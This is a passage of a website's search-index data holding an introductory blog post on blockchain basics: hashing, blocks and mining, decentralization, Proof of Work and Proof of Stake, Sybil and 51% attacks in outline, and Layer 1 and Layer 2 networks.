of data. When you input any kind of data into a hash function, it produces a hash. In this demo, the hash algorithm we\u0026rsquo;ll focus on is SHA-256.\nIf I add\nPatrick Collins to our\nSHA-256 algorithm, it will:\nConvert the letters to numbers Convert the numbers to a fixed-length “string” or “hash” Patrick Collins gets converted to\n7e5b5a1a6b80e2908b534dd5728a998173d502469c37121dd63fca283068077c Ethereum, uses its own version of a hashing algorithm (Keccak256)that isn\u0026rsquo;t exactly SHA-256 but belongs to the SHA family. This doesn\u0026rsquo;t change things significantly here as we\u0026rsquo;re primarily concentrating on the concept of hashing.\nIn the application, whatever data you enter into the data section, undergoes processing by the SHA-256 hash algorithm resulting in a unique hash.\nFor example, when I input my name as \u0026ldquo;Patrick Collins,\u0026rdquo; the resulting hash uniquely represents \u0026ldquo;Patrick Collins.\u0026rdquo; The fascinating aspect is, no matter how much data is input, the length of the generated hash string remains constant.\nUnderstanding Blocks # Now that we\u0026rsquo;ve grasped the concept of hashing and fixed-length string, let\u0026rsquo;s inspect the structure of a blockchain—a collection of \u0026ldquo;blocks.\u0026rdquo;\nA block takes the same data input, but instead of a singular data field, a block is divided into \u0026lsquo;block\u0026rsquo;, \u0026rsquo;nonce\u0026rsquo;, and \u0026lsquo;data.\u0026rsquo; All three are then run through the hash algorithm, producing the hash for that block. As a result, even a minor change in the data leads to an entirely different hash, hence, invalidating the block.\nIn essence, mining involves the computational trial and error process of finding an acceptable value to produce a hash which typically follows a certain pattern, such as starting with four zeros. The value found, which satisfies this criterion, is known as the \u0026rsquo;nonce\u0026rsquo;.\nThe problem or criteria a miner has to solve will vary from blockchain to blockchain, but the concept is the same.\nThe Inherent Beauty of Blockchain: Immutability # In a blockchain, which is essentially a sequence of blocks, each block is comprised of the previous elements - a block number, a nonce and data - as well as\nthe hash of the previous block What this means in practice is that any changes to data, in any block of the chain, will invalidate every proceeding block, until they are recalculated, or re-mined.\nGenesis Block:\nDecentralized Distribution # Now, if a single entity were to control the blockchain, they could conceivably change any data they want, and then re-mine, or re-validate subsequent blocks. This is bad.\nEnter Decentralized Distribution.\nThe crux of blockchain\u0026rsquo;s power lies in its decentralization or distributed nature. Under this system, multiple entities or \u0026ldquo;peers\u0026rdquo; run the blockchain technology, each holding equal weight and power. In the event of disparity between the blockchains run by different peers (due to tampering or otherwise), the majority hash wins, as the majority of the network agrees on it.\nNodes that don\u0026rsquo;t agree with the majority effectively fork the network, continuing on their own with their own history.\nInterplay of Blockchain \u0026amp; Transactions # Until now we\u0026rsquo;ve been considering the data passed in a block to be a random string of text, but the reality is - this data can be anything. In the token and coinbase sections of this demo you can see how each block is comprised of a number of transactions that all get hashed together. Any edits to any of these transactions is going to invalidate the chain!\nWrap Up # To summarize, every transaction, block, and indeed the whole blockchain itself comes down to understanding the concept of a hash—this unique fixed-length string that is intrinsically linked with the original data. We\u0026rsquo;ve also underscored the importance of decentralization and highlighted how the concept of immutability plays into the system\u0026rsquo;s security.\nNB:\nA nonce- is a “number used once” to find the “solution” to the blockchain problem.\nA Block - is a list of transactions mined together\nMining - Process of finding the “solution” to the blockchain “problem”\nBlockchain overview # Preface # I\u0026rsquo;ll start by saying, you\u0026rsquo;ve done great getting his far, if at first some of these concepts are hard to grasp, things will get better with experience as we move through the course and you\u0026rsquo;re exposed to real world examples.\nI definitely would recommend going back and reviewing the parts that you don\u0026rsquo;t quite get and asking questions in the\ndiscussions tab\nof the GitHub repository.\nNow that we know all the cryptography pieces, how the blockchain actually works, how our signatures work and how everything sticks together, let\u0026rsquo;s talk a little bit about how this works in actuality and what\u0026rsquo;s really going on.\nIt\u0026rsquo;s important to note that many of the concepts we\u0026rsquo;ve covered and will cover are going to pertain to Ethereum, or the EVM ecosystem. Each specific blockchain however, may have their own nuances and intricies to watch out for. Trust that the overarching concepts will all be the same, but keep an eye out for the specific criteria that may very from chain to chain, how blocktime is handled, or which hashing algorithm is used for example.\nTraditional Networks vs Blockchain # Traditionally, when you run an application be it a website or something that connects to a server you are interacting with a centralized entity. This is the opposite of what you may recall from our distributed blockchain example, in that the server is controlled and run by a single centralized group.\nBlockchains, as we saw, run on a network of independent nodes. In our previous example, each of the\nPeers was representative of an independent\nnode operator. The term\nnode typically refers to a single instance of a decentralized system, Peer A would be a\nnode . This network, this combination of these nodes interacting with each other is what creates a blockchain. What makes these networks so potent, is that anybody can join. All anyone needs is a little bit a hardward and you can participate in securing a blockchain network. You could go to GitHub and start operating a node in a few seconds!\nIn the traditional world applications are run by centralized entities and if that entity goes down or is malicious or decides that they want to shut off - they just can. They\u0026rsquo;re the ones that control everything.\nBlockchains, by contrast, don\u0026rsquo;t have this problem. If one node or one entity that runs several nodes goes down, since there are so many other independent nodes running, it doesn\u0026rsquo;t matter, the blockchain and the system will persist so long as there is at least one node always running. Luckily for us, the most popular chains like Bitcoin and ethereum have thousands and thousands of nodes. Malicious nodes are kicked from the network, or even punished in some cases. Majority rules when it comes to the blockchain.\nThis gives blockchains this incredibly potent immutability trait where nothing can be changed or corrupted so in essence we can think of a blockchain as a decentralized database. In the case of Ethereum it has an extra additional feature where it also can do computation in a decentralized manner now.\nConsensus # Let\u0026rsquo;s talk consensus. This includes\nProof of Work and\nProof of Stake . You\u0026rsquo;ve probably heard these terms before and they\u0026rsquo;re really important to how these blockchains work.\nThe\nmining feature of our previous blockchain example was an example of\nProof of Work Proof of Work and\nProof of Stake fall under this umbrella of\nconsensus and\nconsensus is a really important topic when it comes to blockchains.\nConsensus\nVery roughly, a consensus protocol in a blockchain or decentralized system can be broken down into two pieces a chain selection algorithm and a sybil resistance mechanism. Mining, or Proof of Work, is a sybil resistance mechanism. This is what Bitcoin currently uses.\nProof of Work is known as a sybil resistance mechanism because it defines a way to figure out who is the block author or which node did the work to mine a block. Sybil resistance is a blockchain\u0026rsquo;s ability to defend against users creating a large number of pseudo-anonymous identities to gain a disproportionately advantageous influence over said system.\nAs mentioned, there are two primary types of sybil resistance:\nProof of Work Proof of Stake We\u0026rsquo;ll look a little closer at\nProof of Work first.\nProof of Work # Proof of work is a system of sybil resistance used in many blockchains, in its essence a miner needs to go through a very computationally heavy process (mining) to find the block\u0026rsquo;s answer. As a result, it doesn\u0026rsquo;t matter how many additional nodes you\u0026rsquo;re running, each node is obligated to do this work in order to receive a reward. The playing field is kept fair.\nNote:\nProof of Work needs to be combined with a\nchain selection rule to create\nconsensus .\nA\nchain selection rule is implemented as a means to determine which blockchain is the\nreal\nblockchain. Bitcoin (and prior to the merge, Ethereum), both use something called\nNakomoto Consensus . This is a combination of Proof of Work (Etherum has since switched to Proof of Stake) and the\nlongest chain rule .\nIn the\nlongest chain rule , the decentralized network decides that whichever chain has the most number of blocks will be the valid, or\nreal\nblockchain. When we saw\nblock confirmations in Etherscan earlier, this was representing the number of blocks ahead of our transaction in the longest chain.\nYou\u0026rsquo;ll sometimes hear people use\nProof of Work\nand\nProof of Work also serves as a means to determine who receives transaction fees as we discussed earlier. These transaction fees are paid by whomever initiates the transaction. In a Proof of Work system, every node is competing against eachother to solve the block problem first. The first node to solve the problem gets paid the transaction fees accumulated in the block they mine. In addition to this, miners are also paid a\nblock reward , the\nblock reward is given by the blockchain itself.\nIf you\u0026rsquo;ve previously heard of the Bitcoin Halving - this is the concept of the block reward being cut in half roughly every 4 years.\nBlock rewards are in the blockchains native currency - Bitcoin = BTC, Ethereum = ETH. This effectively increases the amount of that cryptocurrency in circulation.\nBlockchain Attacks # There are two major types of attacks that exist in the blockchain space.\nSybil Attack - When a user creates a number of pseudo-anonymous accounts to try to influence a network. 51% attack - Occurs when a single entity possesses both the longest chain and majority network control. This would allow the entity to fork the chain and bring the network onto the entities record of events, effectively allowing them to validate anything. Blockchains are very democratic. The bigger a blockchain is, the more decentralized, the more secure it becomes.\nI encourage you to look into running a node yourself to increase the security of the network!\nProof of Work does come with drawbacks. For example, Proof of Work consumes a LOT of electricity. When you have thousands of nodes all working as hard as they can to solve a block problem the energy consumption is HUGE and as such, so is the potential environmental impact.\nWith the above in mind, many protocols are choosing the shift to a different consensus mechanism that is more environmentally friendly. The most popular of which is\u0026hellip;\nProof of Stake # In contrast to trying to solve a block problem, Proof of Stake nodes put up some collateral that they are going to behave honestly aka they\nstake . If a node is found to be misbehaving, it\u0026rsquo;s stake is slashed. This serves as a very effective sybil resistance mechanism because for each account, the validator needs to put up more stake and misbehaving risks losing all that collateral.\nIn a Proof of Stake system,\nminers validators Unlike in Proof of Work, where each node is racing to solve the block problem first, in Proof of Stake, validators are pseudo-randomly chosen to propose the next block and other nodes will validate it.\nProof of Stake of course comes with its own Pros and Cons.\nPros:\ngreat sybil resistance mechanism great for the environment, much less energy Cons:\nseen as less decentralized due to upfront staking costs This raises the question of\nhow decentralized is decentralized enough?\nand I think I need to leave that to the community to decide.\nLayer 1 and Layer 2 # I want to briefly touch on the concepts of Layer 1 and Layer 2 networks here as well.\nLayer 1 solutions: This refers to base layer blockchain implementations like Bitcoin or Ethereum. Layer 2 solutions: These are applications added on top of a layer one, like Chainlink or Arbitrum. Layer 2s like Arbitrum and Optimism are special in that they\u0026rsquo;re trying to solve the problem of scalability. These protocols leverage something called\nrollups . We won\u0026rsquo;t go too deep, but the idea is that the protocols bundle their transactions to be processed by a Layer 1.\nWrap Up # This overview was huge. Amazing work, you now have a fundamental understanding of how blockchains work, how to interact with them and why they\u0026rsquo;re so secure and empowering.\n","date":"29 April 2024","externalUrl":null,"permalink":"/posts/block-chain/","section":"Posts","summary":"Web 3.0","title":"Block Chain","type":"posts"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/categories/programming/","section":"Categories","summary":"","title":"Programming","type":"categories"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/tags/web3.0-intro/","section":"Tags","summary":"","title":"Web3.0 Intro","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]